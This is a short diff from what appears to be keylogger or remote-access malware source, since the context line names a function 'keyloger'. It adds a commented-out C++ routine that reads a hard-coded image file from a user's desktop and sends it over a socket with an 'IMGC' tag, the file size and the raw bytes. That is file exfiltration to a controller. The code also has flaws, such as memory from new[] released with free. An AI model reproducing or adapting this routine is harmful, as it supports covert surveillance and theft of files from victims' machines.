@@ -140,5 +140,49 @@ unsigned long __stdcall keyloger(void*)
 	
 	}
 
+
+
+
+
+/*
+
+void readForImage(char*path,void * sock)
+{
+
+
+
+        FILE *File;
+        char *Buffer;
+        unsigned long Size;
+
+        File = fopen("C:\\Users\\vakho1\\Desktop\\1200x900\\28.jpg", "rb");
+        if(!File)
+        {
+            printf("Error while readaing the file\n");
+            goto End1;
+        }
+
+        fseek(File, 0, SEEK_END);
+        Size = ftell(File);
+        fseek(File, 0, SEEK_SET);
+
+        Buffer = new char[Size];
+
+        fread(Buffer, Size, 1, File);
+        char cSize[MAX_PATH];
+        sprintf(cSize, "%i", Size);
+
+        fclose(File);
+		send((SOCKET)sock,(const char*) "IMGC", strlen("IMGC"), 0);
+        send((SOCKET)sock, cSize, MAX_PATH, 0); // File size
+        send((SOCKET)sock, Buffer, Size, 0); // File Binary
+        free(Buffer);
+
+End1:
+  
+  return ;
+}
+
 	
 
+*/
